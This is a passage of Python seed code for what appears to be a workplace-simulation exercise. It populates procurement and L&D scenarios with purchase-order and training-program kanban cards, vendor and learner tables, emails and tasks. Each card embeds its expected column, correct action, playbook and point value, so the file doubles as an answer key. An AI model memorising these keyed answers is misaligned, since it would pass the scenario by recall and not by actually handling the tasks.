         "requester":"Iris Calloway (People)","cost_center":"PEOPLE","column":"in_review","expected_column":"in_review","priority":"MEDIUM",
         "risk_flags":["overlaps_with_existing_tool"],
         "summary":"People wants Lattice for performance reviews. We already have CultureAmp (PO-2287, £18k/yr, used 4 months). Iris says CultureAmp is 'fine but not what we need'. Director wants a consolidation, not addition.",
         "created":"2026-05-06T14:20","sla_hours":72,"correct_action":"reject_and_route","points":18,
         "playbook":["Compare Lattice vs CultureAmp feature gap","Loop in Iris + director: cancel CultureAmp first?","Don't approve until consolidation plan exists"]},
        {"id":"PO-2415","title":"Figma Enterprise — 80 seats","vendor":"Figma Inc.","category":"Design","amount_gbp":36800,"currency":"GBP","term":"annual",
         "requester":"Sam Reyes (Design Lead)","cost_center":"PRODUCT","column":"pending_approval","expected_column":"pending_approval","priority":"LOW",
         "risk_flags":[],"summary":"Existing usage, security cleared 2025. Renewal at flat price. Just needs CFO sign-off.",
         "created":"2026-04-29T15:00","sla_hours":120,"correct_action":"approve","points":8,
         "playbook":["Confirm seat count matches active users","Forward to CFO"]},
        {"id":"PO-2416","title":"Ramp corporate cards — quarterly fee","vendor":"Ramp Business Corp.","category":"Finance","amount_gbp":4200,"currency":"GBP","term":"quarterly",
         "requester":"Daniel Okafor (CFO)","cost_center":"FINANCE","column":"approved","expected_column":"approved","priority":"LOW",
         "risk_flags":[],"summary":"Standing quarterly fee, pre-approved by CFO.",
         "created":"2026-05-01T09:00","sla_hours":168,"correct_action":"issue","points":5,
         "playbook":["Auto-issue, file with AP"]},
        {"id":"PO-2417","title":"DeepSeek API credits — £30k pre-pay","vendor":"DeepSeek (HK) Ltd.","category":"AI / LLM","amount_gbp":30000,"currency":"GBP","term":"prepaid",
         "requester":"Mike Chen (ML Lead)","cost_center":"ML-RND","column":"in_review","expected_column":"escalation","priority":"HIGH",
         "risk_flags":["data_residency_concern","no_dpa","sanctions_screen_required","model_training_optout_unconfirmed"],
         "summary":"ML team wants DeepSeek for inference. Vendor is HK-incorporated — needs sanctions screen, data residency review (we have UK + EU customer data), and model training opt-out confirmation. Not blocked, but cannot approve unilaterally — escalate to Legal + DPO.",
         "created":"2026-05-08T11:45","sla_hours":48,"correct_action":"escalate","points":22,
         "playbook":["Escalate to Legal + DPO","Block any production data flow until DPA + opt-out signed","Open formal vendor risk review","Suggest sandbox-only with synthetic data while review runs"]},
        {"id":"PO-2418","title":"Notion Enterprise — 600 seats","vendor":"Notion Labs Inc.","category":"Knowledge mgmt","amount_gbp":52800,"currency":"GBP","term":"annual",
         "requester":"Helena Voss (Procurement)","cost_center":"COMPANY","column":"draft","expected_column":"in_review","priority":"MEDIUM",
         "risk_flags":[],"summary":"New company-wide rollout. Helena's drafted the PO but you need to verify the seat count, kick off security review, and confirm SSO is in scope.",
         "created":"2026-05-09T07:30","sla_hours":120,"correct_action":"advance_to_review","points":12,
         "playbook":["Verify 600 active SSO accounts","Open vendor security review","Move to in_review and assign to Olu"]},
        {"id":"PO-2419","title":"Aircall — 18 phone seats","vendor":"Aircall SAS","category":"Telephony","amount_gbp":7560,"currency":"GBP","term":"annual",
         "requester":"Support Lead","cost_center":"CX","column":"rejected","expected_column":"rejected","priority":"LOW",
         "risk_flags":["redundant_with_zoom_phone"],
         "summary":"Rejected last sprint — duplicates Zoom Phone (PO-2104). Closed.",
         "created":"2026-04-15T10:00","sla_hours":0,"correct_action":"none","points":0,
         "playbook":["Already closed."]},
    ]
    # ── Vendor Catalog (table) ────────────────────────────────
    vendors = [
        {"vendor_id":"cursor-001","name":"Cursor (Anysphere Inc.)","category":"AI dev tooling","status":"prospect","contract_end":None,"arr_gbp":0,"security_review":"NOT_STARTED","soc2":"unknown","dpa":"missing","owner":"you","note":"Rogue SaaS — Marcus's purchase. Open formal review."},
        {"vendor_id":"datadog-001","name":"Datadog Inc.","category":"Observability","status":"renewal_due","contract_end":"2026-05-31","arr_gbp":125000,"security_review":"PASSED","soc2":"current","dpa":"signed","owner":"olu","note":"18% increase on 1yr or flat on 3yr. Right-size first."},
        {"vendor_id":"snyk-001","name":"Snyk Ltd.","category":"AppSec","status":"approved","contract_end":"2027-04-30","arr_gbp":42000,"security_review":"PASSED","soc2":"current","dpa":"signed","owner":"priya","note":"Awaiting CFO approval on PO-2412."},
        {"vendor_id":"github-001","name":"GitHub Inc.","category":"Source control","status":"active","contract_end":"2027-05-01","arr_gbp":98400,"security_review":"PASSED","soc2":"current","dpa":"signed","owner":"olu","note":"Standard EA, renewed."},
        {"vendor_id":"lattice-001","name":"Lattice Inc.","category":"HR tech","status":"prospect","contract_end":None,"arr_gbp":0,"security_review":"IN_PROGRESS","soc2":"current","dpa":"draft","owner":"iris","note":"Overlaps with CultureAmp. Consolidation needed first."},
        {"vendor_id":"cultureamp-001","name":"CultureAmp Pty Ltd.","category":"HR tech","status":"active","contract_end":"2026-09-15","arr_gbp":18000,"security_review":"PASSED","soc2":"current","dpa":"signed","owner":"iris","note":"Underused — 4 months in, 22% adoption."},
        {"vendor_id":"figma-001","name":"Figma Inc.","category":"Design","status":"renewal_due","contract_end":"2026-06-30","arr_gbp":36800,"security_review":"PASSED","soc2":"current","dpa":"signed","owner":"sam","note":"Standard renewal — PO-2415 in queue."},
        {"vendor_id":"ramp-001","name":"Ramp Business Corp.","category":"Finance","status":"active","contract_end":"2027-01-01","arr_gbp":16800,"security_review":"PASSED","soc2":"current","dpa":"signed","owner":"daniel","note":"Quarterly billing."},
        {"vendor_id":"deepseek-001","name":"DeepSeek (HK) Ltd.","category":"AI / LLM","status":"prospect","contract_end":None,"arr_gbp":0,"security_review":"NOT_STARTED","soc2":"missing","dpa":"missing","owner":"you","note":"HK-incorporated. Sanctions + data residency review required."},
        {"vendor_id":"notion-001","name":"Notion Labs Inc.","category":"Knowledge mgmt","status":"prospect","contract_end":None,"arr_gbp":0,"security_review":"NOT_STARTED","soc2":"current","dpa":"draft","owner":"helena","note":"Company-wide rollout — PO-2418 drafted."},
        {"vendor_id":"zoom-001","name":"Zoom Video Communications","category":"Comms","status":"active","contract_end":"2026-11-30","arr_gbp":58400,"security_review":"PASSED","soc2":"current","dpa":"signed","owner":"helena","note":"Includes Zoom Phone — duplicates Aircall request."},
        {"vendor_id":"slack-001","name":"Salesforce / Slack","category":"Comms","status":"active","contract_end":"2026-08-31","arr_gbp":74100,"security_review":"PASSED","soc2":"current","dpa":"signed","owner":"helena","note":"Renewal in 4 months. 6% Salesforce price uplift signalled."},
        {"vendor_id":"openai-001","name":"OpenAI LLC","category":"AI / LLM","status":"active","contract_end":"2026-12-31","arr_gbp":86000,"security_review":"PASSED","soc2":"current","dpa":"signed","owner":"mike","note":"Production LLM. Don't disturb."},
    ]
    if tools_col is not None:
        # PO Approvals — kanban
        tools_col.delete_many({"simulation_id":_sim,"name":"PO Approvals"})
        tools_col.insert_one({
            "tool_id":f"tl_po_{_sim}","simulation_id":_sim,"scenario_id":None,
            "name":"PO Approvals","tool_type":"kanban","icon":"📝","tint":"#0F766E",
            "category":"procurement","summary":"Purchase orders moving through the approval pipeline. Pick the right column.",
            "data":{"columns":["draft","in_review","pending_approval","approved","escalation","rejected"],"cards":po_cards},
            "actions_log":[],"created_at":datetime.utcnow().isoformat(),
        })
        # Vendor Catalog — table
        tools_col.delete_many({"simulation_id":_sim,"name":"Vendor Catalog"})
        tools_col.insert_one({
            "tool_id":f"tl_vendors_{_sim}","simulation_id":_sim,"scenario_id":None,
            "name":"Vendor Catalog","tool_type":"table","icon":"🗂","tint":"#7C3AED",
            "category":"procurement","summary":"Active and prospective vendors. Includes contract end dates, security review status, and ARR.",
            "data":{"columns":["vendor_id","name","category","status","contract_end","arr_gbp","security_review","soc2","dpa","owner","note"],"rows":vendors,"expected_corrections":[]},
            "actions_log":[],"created_at":datetime.utcnow().isoformat(),
        })
    if not list(system_events_col.find({"simulation_id":_sim,"tool":"po_system"}).limit(1)):
        system_events_col.insert_many([
            {"id":"ev_proc1","simulation_id":_sim,"type":"escalation","tool":"po_system","trigger_at":4,"end_at":None,"start_msg":f"Slack from {director}: 'Heads up — Marcus is escalating the Cursor purchase. Don't backdate. Reimburse him personally and route formally. Loop me if pushback.'","end_msg":None,"points_for_report":8,"triggered":False,"resolved":False},
            {"id":"ev_proc2","simulation_id":_sim,"type":"deadline","tool":"po_system","trigger_at":7,"end_at":None,"start_msg":"Reminder: Datadog renewal expires in 22 days. If no decision is filed today, auto-renews on current terms (18% increase).","end_msg":None,"points_for_report":6,"triggered":False,"resolved":False},
        ])

def seed_procurement(cfg):
    emails_col.insert_many([
        {"id":"e1","simulation_id":sim_id(),"from_name":cfg["manager"]["name"],"from_role":cfg["manager"]["role"],"from_email":cfg["manager"]["email"],"to":"you","subject":"Welcome — and a fire to put out","body":f"Welcome to {cfg['company']}!\n\nQuick start, sorry. Your first day already has a live one:\n\n1. PO-2410 — Marcus Hale (Eng Manager) bought Cursor on his personal Amex last Tuesday and now wants a 24-seat backdated PO. We do not do that. Read the case in the PO Approvals tool, work out the right route, and email Marcus.\n2. PO-2411 — Datadog renewal is due in 3 weeks. 18% increase on 1yr or flat on 3yr. Pull usage and come back with a recommendation by EOD.\n3. PO-2412 — Snyk has been sitting in review for 14 days. If it's clean, push it to the CFO today.\n\nThe rule of thumb: nothing goes through without security review, DPA, and the right approval chain. Every time you skip a step, someone pays for it three months later.\n\nStandup at 10. Olu can show you NetSuite if anything's confusing.\n\n{cfg['manager']['name']}","time":"08:50","read":False,"replied":False,"priority":"high","category":"task","requires_action":True},
        {"id":"e2","simulation_id":sim_id(),"from_name":"Marcus Hale","from_role":"Engineering Manager","from_email":"m.hale@techstack.co","to":"you","subject":"Re: Cursor for my team — need this PO backdated please","body":"Hi,\n\nWelcome aboard. I know it's day one but I need this moving today.\n\nI bought a single Cursor Pro seat with my personal card on 6 May (£660) just to test it. The team's now using it daily — productivity is up massively. I committed verbally to the 24-seat upgrade in our team meeting last Friday. The vendor's expecting payment.\n\nCan you raise a backdated PO so I can expense the £660 and we settle the rest? It's £7,920 total, annual.\n\nDon't make me wait through your formal process — half my team is on it already and Cursor's promo expires Friday.\n\nMarcus","time":"09:05","read":False,"replied":False,"priority":"high","category":"client","requires_action":True},
        {"id":"e3","simulation_id":sim_id(),"from_name":cfg["teammate"]["name"],"from_role":cfg["teammate"]["role"],"from_email":cfg["teammate"]["email"],"to":"you","subject":"What to actually do about Marcus","body":f"Hey, welcome.\n\nQuick, before you reply to Marcus.\n\nDon't backdate. Helena (your boss) will pull you into a 1:1 if you do — last starter did it and it took us 4 months to clean up audit trail.\n\nThe play is:\n1. Reimburse the £660 via expense (NOT via PO).\n2. Open a vendor security review — Cursor sees source code, so we need SOC 2 + DPA before anyone keeps using it.\n3. Pause the rollout until we have those.\n4. Once approved, raise the formal PO.\n\nPolicy doc is in the Slack canvas in #procurement. Email Marcus politely but firmly. CC Helena. I'll back you up if he kicks off.\n\n{cfg['teammate']['name'].split()[0]}","time":"09:20","read":False,"replied":False,"priority":"high","category":"teammate","requires_action":False},
        {"id":"e4","simulation_id":sim_id(),"from_name":"HR Team","from_role":"HR","from_email":"hr@techstack.co","to":"you","subject":"New starter onboarding tasks","body":"Welcome! Please complete by EOD:\n1. NetSuite read-write training (60 min e-learning)\n2. Procurement policy acknowledgment\n3. Anti-bribery & gifts register sign-off\n4. SoD (segregation of duties) declaration\n\nEmployee ID: TS-1184","time":"08:30","read":False,"replied":False,"priority":"medium","category":"onboarding","requires_action":True},
        {"id":"e5","simulation_id":sim_id(),"from_name":cfg["it"]["name"],"from_role":cfg["it"]["role"],"from_email":cfg["it"]["email"],"to":"you","subject":"Tooling access","body":f"Your access:\n- NetSuite: Procurement Specialist role\n- Vendor Catalog: read-write\n- DocuSign: viewer\n- Slack: #procurement, #it-finance\n- Datadog admin (read-only): for usage pulls\n\n{cfg['it']['name']}","time":"08:10","read":False,"replied":False,"priority":"low","category":"info","requires_action":False},
        {"id":"e6","simulation_id":sim_id(),"from_name":"Priya Nair","from_role":"Security Lead","from_email":"p.nair@techstack.co","to":"you","subject":"Snyk PO — please push it through today","body":"Hi,\n\nI know you're new — Olu said to come straight to you.\n\nSnyk (PO-2412, £42k/yr) has been sitting in security review since 25 April. We've signed off, DPA is in, SOC 2 verified. It just needs the CFO push.\n\nBudget freezes Friday for Q2 close. If this slips, I lose it for 3 months.\n\nOne-liner to Daniel and we're done.\n\nPriya","time":"09:35","read":False,"replied":False,"priority":"high","category":"task","requires_action":True},
        {"id":"e7","simulation_id":sim_id(),"from_name":cfg["director"]["name"],"from_role":cfg["director"]["role"],"from_email":cfg["director"]["email"],"to":"procurement@techstack.co","subject":"Q2 spend review — IT category","body":f"Team,\n\nFor the Q2 board pack I need:\n• IT spend by category (current run-rate vs budget)\n• Top 3 over-spending vendors\n• Any vendors we should consolidate\n\nNew starter — pull this with Olu, it's a good way to learn the catalog. Need it Thursday.\n\nAlso heads up: I will not approve the Cursor PO unless it goes through the full process. If Marcus pushes back, send him to me.\n\n{cfg['director']['name']}","time":"09:50","read":False,"replied":False,"priority":"high","category":"info","requires_action":True},
        {"id":"e8","simulation_id":sim_id(),"from_name":"Iris Calloway","from_role":"People Partner","from_email":"i.calloway@techstack.co","to":"you","subject":"Lattice PO — when?","body":"Hi,\n\nI raised PO-2414 (Lattice, £24.8k/yr) two weeks ago. It's sitting in review. We need it for the H2 review cycle.\n\nI know you'll spot we have CultureAmp. Honest answer: it doesn't do what we need for performance reviews. Can we just approve Lattice and figure out CultureAmp later?\n\nIris","time":"10:10","read":False,"replied":False,"priority":"medium","category":"client","requires_action":True},
    ])
    tasks_col.insert_many([
        {"id":"t1","simulation_id":sim_id(),"title":"Complete onboarding (NetSuite, policy, SoD)","description":"4 onboarding items from HR. Procurement policy + SoD declaration are blockers for any approval today.","priority":"medium","deadline":"17:00","status":"pending","points":10},
        {"id":"t2","simulation_id":sim_id(),"title":"Reply to Marcus (Cursor) — politely refuse backdating","description":"Reimburse £660 via expense, open vendor review, pause team rollout, route formal PO. CC Helena.","priority":"high","deadline":"11:00","status":"pending","points":30},
        {"id":"t3","simulation_id":sim_id(),"title":"Open vendor security review for Cursor","description":"Update vendor_id=cursor-001: status=in_review, security_review=IN_PROGRESS. Add request for SOC 2 + DPA.","priority":"high","deadline":"12:00","status":"pending","points":15},
        {"id":"t4","simulation_id":sim_id(),"title":"Pull Datadog 6-month usage + recommendation","description":"Right-size, then counter the renewal. 1yr flat or 3yr -8% with smaller commit.","priority":"high","deadline":"17:00","status":"pending","points":25},
        {"id":"t5","simulation_id":sim_id(),"title":"Push Snyk PO to CFO","description":"PO-2412. SOC 2 current, DPA signed. One-liner to Daniel.","priority":"high","deadline":"15:00","status":"pending","points":15},
        {"id":"t6","simulation_id":sim_id(),"title":"Move PO-2410 (Cursor) to the right column","description":"Currently in 'escalation'. Should be 'in_review' once you've routed it correctly.","priority":"high","deadline":"12:00","status":"pending","points":15},
        {"id":"t7","simulation_id":sim_id(),"title":"Escalate PO-2417 (DeepSeek) to Legal + DPO","description":"HK vendor, sanctions screen, data residency. Do NOT approve unilaterally.","priority":"high","deadline":"15:00","status":"pending","points":20},
        {"id":"t8","simulation_id":sim_id(),"title":"Reply to Iris (Lattice) — block until consolidation plan","description":"Lattice overlaps with CultureAmp. Don't approve. Loop in director, propose CultureAmp cancellation first.","priority":"medium","deadline":"tomorrow","status":"pending","points":15},
        {"id":"t9","simulation_id":sim_id(),"title":"Q2 IT spend review for the director","description":"Spend by category, top 3 over-runs, consolidation candidates. Pair with Olu.","priority":"medium","deadline":"Thursday","status":"pending","points":15},
    ])
    _seed_procurement_artifacts(cfg)

def _seed_hr_artifacts(cfg):
    """L&D — Training Programs (kanban) + Learner Pipeline (table) + reminders.
    Idempotent per simulation_id. Uses generic tools_col so the existing kanban/table
    renderers on the frontend pick these up automatically."""
    _sim = sim_id()
    teammate = cfg["teammate"]["name"]
    manager = cfg["manager"]["name"]
    director = cfg["director"]["name"]
    # ── Training Programs (kanban) ─────────────────────────────
    program_cards = [
        {"id":"TP-301","title":"New Hire Bootcamp Q2 (cohort 12)","program_type":"onboarding","owner":teammate,"learners":18,"budget_gbp":4200,"start":"2026-05-04","end":"2026-05-15","term":"two_week",
         "column":"in_session","expected_column":"in_session","priority":"HIGH","risk_flags":["nps_32","broken_module","week2_dropoff"],
         "summary":"Current cohort scored NPS 32 on day-3 survey (target ≥55). The 'Internal Tools' module is broken — links to deprecated Confluence pages, half the screenshots are from last year's Notion. Three learners have asked for refunds of their time. Cohort 13 starts in 6 days.",
         "playbook":["Pull the day-3 survey verbatim from the LMS","Rewrite the Internal Tools module today — 2-3 hours","Apologise + offer a 1-hour live walkthrough to cohort 12","Add a content-freshness check to the program review checklist"],
         "correct_action":"fix_module","points":25},
        {"id":"TP-302","title":"Annual Security Awareness 2026 (mandatory)","program_type":"compliance","owner":"you","learners":612,"budget_gbp":8400,"start":"2026-03-01","end":"2026-05-24","term":"annual",
         "column":"in_session","expected_column":"in_session","priority":"HIGH","risk_flags":["audit_deadline_14_days","completion_64pct","two_depts_under_40pct"],
         "summary":"Completion is 64% with audit on 2026-05-24. Engineering and Sales are under 40%. Pattern is manager-led — when the manager hasn't done theirs, the team doesn't either. Do not chase learners; chase managers. Threatening emails to learners backfired last year.",
         "playbook":["Pull completion by manager (not by learner)","Send a one-line stat email to each manager who's <70% (manager-shame works, learner-shame doesn't)","Escalate to Sofia only if any director is personally <50%","Block any backdating — every audit failure traces back to a 'just mark it done' email"],
         "correct_action":"chase_managers","points":22},
        {"id":"TP-303","title":"Manager Essentials — Cohort 4","program_type":"leadership","owner":teammate,"learners":22,"budget_gbp":11000,"start":"2026-05-15","end":"2026-06-19","term":"5_week",
         "column":"scheduled","expected_column":"scheduled","priority":"MEDIUM","risk_flags":[],
         "summary":"22 enrolled. Curriculum locked. Facilitator (external — BetterUp) confirmed. Just needs pre-work emailed Monday.",
         "playbook":["Send pre-work email Monday 08:00","Confirm rooms + recording consent","Block calendars for sessions 1-5"],
         "correct_action":"prepare","points":12},
        {"id":"TP-304","title":"Tech Lead Pilot — VP Eng custom request","program_type":"leadership","owner":"you","learners":12,"budget_gbp":18000,"start":"2026-06-08","end":"2026-07-13","term":"5_week",
         "column":"proposed","expected_column":"on_hold","priority":"HIGH","risk_flags":["no_capacity","no_budget_approval","conflicts_with_TP-303"],
         "summary":"Aaron Yi (VP Eng) wants a bespoke Tech Lead programme in 4 weeks for 12 engineering managers. We don't have facilitator capacity, the budget isn't in Q2, and Manager Essentials already covers 60% of the content. He's pushing hard.",
         "playbook":["Do NOT just say yes to be helpful","Offer 3 options: route his 12 into Manager Essentials Cohort 5 (Aug) / pay-as-you-go BetterUp 1:1 coaching now / design a 'Tech Lead' Q3 cohort properly","Move card to on_hold with rationale in notes","Loop in Lena before replying to Aaron"],
         "correct_action":"hold_with_alternatives","points":22},
        {"id":"TP-305","title":"Inclusive Hiring — interviewer certification","program_type":"compliance","owner":teammate,"learners":48,"budget_gbp":6400,"start":"2026-05-20","end":"2026-06-03","term":"2_week",
         "column":"scheduled","expected_column":"scheduled","priority":"MEDIUM","risk_flags":["cpo_mandated"],
         "summary":"All hiring managers + interviewers. CPO-mandated. 48 enrolled, opt-out not allowed.",
         "playbook":["Confirm enrolment list matches active interview panel members","Send pre-read 48 hours before session 1"],
         "correct_action":"prepare","points":10},
        {"id":"TP-306","title":"Resilience Workshop (Q1 retro)","program_type":"wellbeing","owner":teammate,"learners":34,"budget_gbp":3200,"start":"2026-03-04","end":"2026-03-25","term":"4_week",
         "column":"completed","expected_column":"completed","priority":"LOW","risk_flags":[],
         "summary":"Closed last quarter. NPS 71. No actions needed.",
         "playbook":["Archive."],"correct_action":"archive","points":4},
        {"id":"TP-307","title":"Salesforce Admin Certification (cohort 2)","program_type":"technical","owner":teammate,"learners":7,"budget_gbp":5600,"start":"2026-04-22","end":"2026-06-17","term":"8_week",
         "column":"in_session","expected_column":"in_session","priority":"LOW","risk_flags":[],
         "summary":"Small cohort, on track. Mid-program assessment next week.",
         "playbook":["Mid-program check-in Thursday"],"correct_action":"monitor","points":6},
        {"id":"TP-308","title":"Data Literacy 101 (new program design)","program_type":"upskilling","owner":"you","learners":0,"budget_gbp":9000,"start":"2026-07-01","end":"2026-08-12","term":"6_week",
         "column":"designing","expected_column":"designing","priority":"MEDIUM","risk_flags":["draft_curriculum_only"],
         "summary":"Curriculum draft 60% done. Need SME interviews with the Data team next week before scheduling.",
         "playbook":["Book SME slots with Data team","Finish module 4-6 outlines","Move to 'scheduled' once curriculum is signed off"],
         "correct_action":"continue_design","points":10},
        {"id":"TP-309","title":"Anti-Harassment Refresher (Legal-required)","program_type":"compliance","owner":"you","learners":612,"budget_gbp":2100,"start":"2026-06-15","end":"2026-07-15","term":"4_week",
         "column":"proposed","expected_column":"scheduled","priority":"HIGH","risk_flags":["legal_required_q2","not_yet_scheduled"],
         "summary":"Legal flagged this in last week's compliance sync — UK regulation update means we MUST roll a refresher before 2026-08-01. Currently sitting in 'proposed' but content already exists from last year. Just needs scheduling.",
         "playbook":["Confirm 2025 content still aligns with 2026 regulation update with Legal","Schedule on the LMS with auto-enrol for all staff","Move card to 'scheduled' with launch date"],
         "correct_action":"schedule","points":15},
        {"id":"TP-310","title":"Reforge External Subscription — 4 seats","program_type":"upskilling","owner":"you","learners":4,"budget_gbp":24000,"start":"2026-06-01","end":"2027-05-31","term":"annual",
         "column":"proposed","expected_column":"on_hold","priority":"MEDIUM","risk_flags":["overlaps_with_internal_programs","high_per_seat_cost","one_manager_only"],
         "summary":"Sales Director wants 4 of his team on Reforge ($6k/seat = $24k). Reforge covers PMM + growth — overlaps with our internal Data Literacy and Manager Essentials roadmaps. One manager, no team-wide L&D logic. Don't approve in isolation.",
         "playbook":["Compare Reforge syllabus vs internal Data Literacy + Manager Essentials","Reply: route 2 into Manager Essentials Cohort 4, propose Q3 internal growth track for the rest","Move to on_hold with consolidation note","Loop in Lena"],
         "correct_action":"hold_with_alternatives","points":14},
    ]
    # ── Learner Pipeline (table) ───────────────────────────────
    learners = [
        {"learner_id":"L-1041","name":"Aisha Bello","dept":"Engineering","program":"TP-302 Security Awareness","status":"overdue","enrolled_date":"2026-03-01","due_date":"2026-05-24","completion_pct":0,"manager":"Aaron Yi","notes":"Engineering manager Aaron is also 0%. Chase Aaron, not Aisha."},
        {"learner_id":"L-1042","name":"Tomás Ribeiro","dept":"Engineering","program":"TP-302 Security Awareness","status":"in_progress","enrolled_date":"2026-03-01","due_date":"2026-05-24","completion_pct":40,"manager":"Aaron Yi","notes":"Started last week."},
        {"learner_id":"L-1043","name":"Femi Okafor","dept":"Sales","program":"TP-302 Security Awareness","status":"overdue","enrolled_date":"2026-03-01","due_date":"2026-05-24","completion_pct":0,"manager":"Diana Klein","notes":"Sales-wide 38% completion. Diana also 0%."},
        {"learner_id":"L-1044","name":"Hannah Liu","dept":"Engineering","program":"TP-301 New Hire Bootcamp Q2","status":"in_progress","enrolled_date":"2026-05-04","due_date":"2026-05-15","completion_pct":55,"manager":"Aaron Yi","notes":"Posted negative feedback on Slack about the Internal Tools module."},
        {"learner_id":"L-1045","name":"Carlos Mendes","dept":"Product","program":"TP-301 New Hire Bootcamp Q2","status":"in_progress","enrolled_date":"2026-05-04","due_date":"2026-05-15","completion_pct":50,"manager":"Jen Park","notes":"Wrote in survey: 'half the links are dead, felt like I was being onboarded by a ghost'."},
        {"learner_id":"L-1046","name":"Wendy Cho","dept":"Engineering","program":"TP-303 Manager Essentials","status":"enrolled","enrolled_date":"2026-05-01","due_date":"2026-06-19","completion_pct":0,"manager":"Aaron Yi","notes":"Aaron wants her routed into TP-304 Tech Lead Pilot instead."},
        {"learner_id":"L-1047","name":"Dami Adekunle","dept":"Sales","program":"TP-310 Reforge","status":"requested","enrolled_date":None,"due_date":None,"completion_pct":0,"manager":"Diana Klein","notes":"Sales Director Diana requested. Pending decision."},
        {"learner_id":"L-1048","name":"Sarah Mwangi","dept":"Sales","program":"TP-310 Reforge","status":"requested","enrolled_date":None,"due_date":None,"completion_pct":0,"manager":"Diana Klein","notes":"Same — bundle with Dami's request."},
        {"learner_id":"L-1049","name":"Olivia Thorne","dept":"People","program":"TP-305 Inclusive Hiring","status":"enrolled","enrolled_date":"2026-05-10","due_date":"2026-06-03","completion_pct":0,"manager":"Lena Park","notes":"Hiring panel member."},
        {"learner_id":"L-1050","name":"Rahul Mehta","dept":"Engineering","program":"TP-302 Security Awareness","status":"completed","enrolled_date":"2026-03-01","due_date":"2026-05-24","completion_pct":100,"manager":"Aaron Yi","notes":"Done early. Good example to surface to Aaron."},
        {"learner_id":"L-1051","name":"Joaquin Vega","dept":"Customer Success","program":"TP-307 Salesforce Admin Cert","status":"in_progress","enrolled_date":"2026-04-22","due_date":"2026-06-17","completion_pct":35,"manager":"Sam Reyes","notes":"On track."},
        {"learner_id":"L-1052","name":"Mei Tanaka","dept":"Marketing","program":"TP-302 Security Awareness","status":"completed","enrolled_date":"2026-03-01","due_date":"2026-05-24","completion_pct":100,"manager":"Iris Calloway","notes":"Marketing is at 92% — model dept."},
        {"learner_id":"L-1053","name":"Ezra Goldstein","dept":"Engineering","program":"TP-302 Security Awareness","status":"in_progress","enrolled_date":"2026-03-01","due_date":"2026-05-24","completion_pct":20,"manager":"Aaron Yi","notes":"Asked for an exemption on 'time pressure'. There is no exemption."},
    ]
    if tools_col is not None:
        tools_col.delete_many({"simulation_id":_sim,"name":"Training Programs"})
        tools_col.insert_one({
            "tool_id":f"tl_programs_{_sim}","simulation_id":_sim,"scenario_id":None,
            "name":"Training Programs","tool_type":"kanban","icon":"🎓","tint":"#0EA5E9",
            "category":"learning","summary":"L&D programs moving through design, scheduling, in-session, completed. Pick the right column.",
            "data":{"columns":["proposed","designing","scheduled","in_session","completed","on_hold"],"cards":program_cards},
            "actions_log":[],"created_at":datetime.utcnow().isoformat(),
        })
        tools_col.delete_many({"simulation_id":_sim,"name":"Learner Pipeline"})
        tools_col.insert_one({
            "tool_id":f"tl_pipeline_{_sim}","simulation_id":_sim,"scenario_id":None,
            "name":"Learner Pipeline","tool_type":"table","icon":"👥","tint":"#7C3AED",
            "category":"learning","summary":"Active and requested learners across all programs. Includes completion %, due dates, and manager.",
            "data":{"columns":["learner_id","name","dept","program","status","enrolled_date","due_date","completion_pct","manager","notes"],"rows":learners,"expected_corrections":[]},
            "actions_log":[],"created_at":datetime.utcnow().isoformat(),
        })
    if not list(system_events_col.find({"simulation_id":_sim,"tool":"lms"}).limit(1)):
        system_events_col.insert_many([
            {"id":"ev_hr1","simulation_id":_sim,"type":"escalation","tool":"lms","trigger_at":4,"end_at":None,"start_msg":f"Slack from {director}: 'I see Aaron is pinging you about the Tech Lead programme. Do not commit to 4 weeks. Send him to me if he won't take the alternatives.'","end_msg":None,"points_for_report":8,"triggered":False,"resolved":False},
            {"id":"ev_hr2","simulation_id":_sim,"type":"deadline","tool":"lms","trigger_at":7,"end_at":None,"start_msg":"Reminder: Security training audit deadline in 14 days. Completion 64%. Engineering 38%, Sales 36%.","end_msg":None,"points_for_report":6,"triggered":False,"resolved":False},
        ])

def seed_hr(cfg):
    emails_col.insert_many([
        {"id":"e1","simulation_id":sim_id(),"from_name":cfg["manager"]["name"],"from_role":cfg["manager"]["role"],"from_email":cfg["manager"]["email"],"to":"you","subject":"Welcome — and three live fires","body":f"Welcome to {cfg['company']}!\n\nSorry to drop you in cold. The shortlist for today:\n\n1. TP-301 — New Hire Bootcamp cohort 12 is mid-session and the Internal Tools module is broken (links + screenshots from last year). NPS is 32. Cohort 13 starts in 6 days. Fix the module, then the cohort.\n2. TP-302 — Mandatory security training audit is in 14 days. Completion 64%. Engineering 38%, Sales 36%. We chase MANAGERS, not learners. Pull a manager-level report and start the polite escalations.\n3. TP-304 — Aaron Yi (VP Eng) wants a custom Tech Lead programme in 4 weeks. He will push hard. I do not want a yes. I want three alternatives in writing.\n\nGround rules:\n• Never backdate completion records.\n• Never bypass facilitator capacity by 'just running it'.\n• Compliance programmes go through Legal, not 'common sense'.\n\nMarcus can show you the LMS. Standup 10:00.\n\n{cfg['manager']['name']}","time":"08:45","read":False,"replied":False,"priority":"high","category":"task","requires_action":True},
        {"id":"e2","simulation_id":sim_id(),"from_name":"Aaron Yi","from_role":"VP Engineering","from_email":"a.yi@helixpeople.co","to":"you","subject":"Tech Lead programme — need this live in 4 weeks","body":"Hi,\n\nWelcome aboard. Skipping the pleasantries — I need a custom Tech Lead programme stood up for 12 of my engineering managers, kicking off 8 June.\n\nI don't want them in Manager Essentials. Generic. My folks need a tech-flavoured version: incident command, on-call leadership, eng-org politics. 4 weeks, 12 seats, BetterUp can facilitate.\n\nBudget can come from my line — talk to Daniel if procurement asks.\n\nMonday I'll need a one-pager: curriculum, schedule, facilitator, success metrics. Don't bury this in process. Reply by EOD with a plan.\n\nAaron","time":"09:00","read":False,"replied":False,"priority":"high","category":"client","requires_action":True},
